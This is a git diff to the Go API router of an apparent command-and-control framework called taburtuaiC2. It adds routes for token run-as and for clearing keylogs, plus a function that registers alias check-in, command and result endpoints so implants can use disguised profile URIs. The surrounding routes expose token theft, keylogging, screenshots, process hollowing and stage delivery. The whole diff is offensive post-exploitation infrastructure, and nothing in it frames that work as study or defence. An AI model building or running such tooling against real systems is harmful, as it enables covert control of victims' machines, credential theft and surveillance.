@@ -5,6 +5,7 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"github.com/mjopsec/taburtuaiC2/internal/core"
+	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
 )
 
 // Router handles API routing
@@ -95,12 +96,14 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/token/steal", r.handlers.TokenSteal)
 		v1.POST("/agent/:id/token/make", r.handlers.TokenMake)
 		v1.POST("/agent/:id/token/revert", r.handlers.TokenRevert)
+		v1.POST("/agent/:id/token/runas", r.handlers.TokenRunAs)
 
 		// Phase 3 — Reconnaissance
 		v1.POST("/agent/:id/screenshot", r.handlers.Screenshot)
 		v1.POST("/agent/:id/keylog/start", r.handlers.KeylogStart)
 		v1.POST("/agent/:id/keylog/dump", r.handlers.KeylogDump)
 		v1.POST("/agent/:id/keylog/stop", r.handlers.KeylogStop)
+		v1.POST("/agent/:id/keylog/clear", r.handlers.KeylogClear)
 
 		// Phase 4 — Advanced injection
 		v1.POST("/agent/:id/inject/hollow", r.handlers.Hollow)
@@ -178,4 +181,26 @@ func (r *Router) Setup() *gin.Engine {
 	router.GET("/stage/:token", r.handlers.ServeStage)
 
 	return router
+}
+
+// RegisterProfileAliases adds alias routes for a non-default C2 profile so
+// agents using that profile can reach the same handlers via their profile URIs.
+// Call this after Setup() on the returned *gin.Engine.
+func (r *Router) RegisterProfileAliases(engine *gin.Engine, profileName string) {
+	if profileName == "" || profileName == "default" {
+		return
+	}
+	p := profiles.Get(profileName)
+	if p.Name == "default" {
+		return // unknown profile name — Get() fell back to default, skip
+	}
+
+	// Checkin alias
+	engine.POST(p.CheckinPath, r.handlers.AgentCheckin)
+
+	// Command-next alias — gin pattern uses :id instead of {agent_id}
+	engine.GET(p.CommandGinPattern(), r.handlers.GetNextCommand)
+
+	// Result alias
+	engine.POST(p.ResultPath, r.handlers.SubmitCommandResult)
 }
